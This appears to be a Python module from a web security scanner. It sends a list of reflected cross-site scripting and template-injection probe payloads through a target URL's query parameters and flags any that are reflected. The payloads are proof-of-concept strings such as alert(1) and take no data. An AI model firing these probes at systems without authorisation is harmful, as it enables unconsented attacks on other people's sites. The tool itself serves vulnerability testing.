import requests
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from config import DEFAULT_TIMEOUT

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    '"><img src=x onerror=alert(1)>',
    "<body onload=alert(1)>",
    '{{7*7}}',
    "${7*7}",
]


def scan_xss(url: str) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        params = {"q": ["test"], "search": ["test"], "id": ["1"]}

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                if payload.lower() in r.text.lower():
                    findings.append({
                        "type": "XSS",
                        "severity": "High",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Payload reflected in response (status {r.status_code})",
                    })
                    break
            except Exception:
                continue

    return findings
